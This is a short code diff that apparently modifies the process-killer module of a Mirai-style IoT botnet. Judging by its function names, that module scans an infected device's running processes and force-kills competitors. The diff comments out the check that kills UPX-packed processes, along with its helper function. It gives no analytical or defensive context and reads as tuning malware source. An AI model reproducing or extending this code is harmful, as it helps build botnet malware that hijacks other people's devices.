@@ -190,10 +190,10 @@ void killer_init(void)
 
             
 			
-            if (upx_scan_match(exe_path, status_path))
+            /*if (upx_scan_match(exe_path, status_path))
             {
                 kill(pid, 9);
-            }
+            }*/
             
 
             util_zero(exe_path, sizeof (exe_path));
@@ -397,7 +397,7 @@ static BOOL has_exe_access(void)
 }
 
 
-static BOOL status_upx_check(char *exe_path, char *status_path)
+/*static BOOL status_upx_check(char *exe_path, char *status_path)
 {
     int fd, ret;
 
@@ -425,7 +425,8 @@ static BOOL status_upx_check(char *exe_path, char *status_path)
 
     close(fd);
     return FALSE;
-}
+}*/
+
 
 
 static BOOL memory_scan_match(char *path)
